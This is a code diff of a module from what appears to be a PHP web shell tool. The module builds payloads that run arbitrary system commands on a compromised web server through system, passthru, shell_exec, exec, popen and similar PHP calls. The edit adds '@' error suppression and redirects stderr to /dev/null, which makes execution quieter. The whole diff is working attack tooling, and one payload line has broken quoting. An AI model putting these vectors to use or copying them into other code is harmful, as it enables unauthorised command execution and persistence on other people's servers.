@@ -16,10 +16,11 @@ class Sh(ModuleGuess):
     '''Execute system shell command'''
 
     def _set_vectors(self):
-        self.vectors.add_vector("system", 'shell.php', "system('$cmd$stderr');")
-        self.vectors.add_vector("passthru" , 'shell.php', "passthru('$cmd$stderr');")
-        self.vectors.add_vector("shell_exec", 'shell.php', "echo shell_exec('$cmd$stderr');")
-        self.vectors.add_vector("exec", 'shell.php',  "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));")
+        self.vectors.add_vector("system", 'shell.php', "@system('$cmd $stderr');")
+        self.vectors.add_vector("passthru" , 'shell.php', "@passthru('$cmd $stderr');")
+        self.vectors.add_vector("shell_exec", 'shell.php', "echo @shell_exec('$cmd $stderr');")
+        self.vectors.add_vector("exec", 'shell.php',  "@exec('$cmd $stderr', $r);echo(join(\"\\n\",$r));")
+
         #self.vectors.add_vector("pcntl", 'shell.php', ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
         self.vectors.add_vector("popen", 'shell.php', "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);")
         self.vectors.add_vector("python_eval", 'shell.php', "python_eval('import os; os.system('$cmd$stderr');")
@@ -56,9 +57,9 @@ fclose($pipes[2]); proc_close($h);""")
         # Format stderr
         if any('$stderr' in p for p in self.current_vector.payloads):
             if self.args['stderr']:
-                self.formatted_args['stderr'] = ''
+                self.formatted_args['stderr'] = '2>/dev/null' 
             else:
-                self.formatted_args['stderr'] = ' 2>&1'
+                self.formatted_args['stderr'] = '2>&1'
  
 
 
